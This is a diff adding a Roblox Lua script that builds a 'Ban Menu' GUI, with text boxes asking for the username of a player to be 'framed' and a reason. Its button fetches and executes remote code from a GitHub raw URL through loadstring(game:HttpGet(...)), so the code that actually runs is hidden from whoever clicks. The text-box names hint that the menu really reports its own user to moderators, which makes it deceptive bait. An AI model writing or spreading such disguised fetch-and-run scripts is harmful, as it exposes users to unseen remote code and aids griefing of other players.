@@ -1,0 +1,95 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local actuallysecretlyrecordstosendmodsproof = Instance.new("TextBox")
+local thisActuallysendmodsyourExploitsTypes = Instance.new("TextBox")
+local TextButton = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.128700137, 0, 0.358162105, 0)
+Frame.Size = UDim2.new(0, 443, 0, 264)
+Frame.Active = true
+Frame.Draggable = true
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(3.44442199e-08, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 442, 0, 38)
+TextLabel.Font = Enum.Font.Michroma
+TextLabel.Text = "Ban Menu#SbScripts24-25"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 14.000
+TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextStrokeTransparency = 0.000
+
+actuallysecretlyrecordstosendmodsproof.Name = "actuallysecretlyrecordstosendmodsproof"
+actuallysecretlyrecordstosendmodsproof.Parent = Frame
+actuallysecretlyrecordstosendmodsproof.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+actuallysecretlyrecordstosendmodsproof.BackgroundTransparency = 1.000
+actuallysecretlyrecordstosendmodsproof.BorderColor3 = Color3.fromRGB(0, 0, 0)
+actuallysecretlyrecordstosendmodsproof.BorderSizePixel = 0
+actuallysecretlyrecordstosendmodsproof.Position = UDim2.new(0.0180586912, 0, 0.219696969, 0)
+actuallysecretlyrecordstosendmodsproof.Size = UDim2.new(0, 398, 0, 50)
+actuallysecretlyrecordstosendmodsproof.Font = Enum.Font.Michroma
+actuallysecretlyrecordstosendmodsproof.PlaceholderText = "PlayersUsername that geting framed"
+actuallysecretlyrecordstosendmodsproof.Text = ""
+actuallysecretlyrecordstosendmodsproof.TextColor3 = Color3.fromRGB(0, 0, 0)
+actuallysecretlyrecordstosendmodsproof.TextSize = 14.000
+
+thisActuallysendmodsyourExploitsTypes.Name = "thisActuallysendmodsyourExploitsTypes"
+thisActuallysendmodsyourExploitsTypes.Parent = Frame
+thisActuallysendmodsyourExploitsTypes.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+thisActuallysendmodsyourExploitsTypes.BackgroundTransparency = 1.000
+thisActuallysendmodsyourExploitsTypes.BorderColor3 = Color3.fromRGB(0, 0, 0)
+thisActuallysendmodsyourExploitsTypes.BorderSizePixel = 0
+thisActuallysendmodsyourExploitsTypes.Position = UDim2.new(0.0180586912, 0, 0.446969688, 0)
+thisActuallysendmodsyourExploitsTypes.Size = UDim2.new(0, 398, 0, 51)
+thisActuallysendmodsyourExploitsTypes.Font = Enum.Font.Michroma
+thisActuallysendmodsyourExploitsTypes.PlaceholderText = "reason (WE TAKE INFO PLZ ANSWER RIGHTLY)"
+thisActuallysendmodsyourExploitsTypes.Text = ""
+thisActuallysendmodsyourExploitsTypes.TextColor3 = Color3.fromRGB(0, 0, 0)
+thisActuallysendmodsyourExploitsTypes.TextSize = 14.000
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.BackgroundTransparency = 1.000
+TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(3.44442199e-08, 0, 0.636363626, 0)
+TextButton.Size = UDim2.new(0, 442, 0, 96)
+TextButton.Font = Enum.Font.Michroma
+TextButton.Text = "ban "
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 14.000
+TextButton.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextStrokeTransparency = 0.000
+
+-- Scripts:
+
+local function GEZFZKD_fake_script() -- TextButton.Script 
+	local script = Instance.new('Script', TextButton)
+
+	function onButtonClicked()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/RobloxScripts2020/SlapBattlesCoders/refs/heads/main/-1000/banofev'))()
+	end
+	
+	script.Parent.MouseButton1Click:connect(onButtonClicked)
+	
+end
+coroutine.wrap(GEZFZKD_fake_script)()
